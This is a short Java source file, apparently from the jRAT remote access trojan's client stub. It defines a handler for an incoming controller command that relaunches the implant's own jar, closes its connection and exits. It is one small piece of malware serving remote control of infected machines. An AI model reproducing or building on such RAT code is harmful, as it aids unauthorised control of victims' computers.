package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.downloadable.JavaArchive;
import se.jrat.stub.Connection;
import se.jrat.stub.utils.Utils;

public class Packet37RestartJavaProcess extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Utils.getJarFile().getAbsolutePath());

		if (file.isFile()) {
			JavaArchive jar = new JavaArchive();
			jar.execute(file);
			
			try {
				Connection.instance.getSocket().close();
			} catch (Exception ex) {
				
			}
			
			System.exit(0);
		}
	}

}
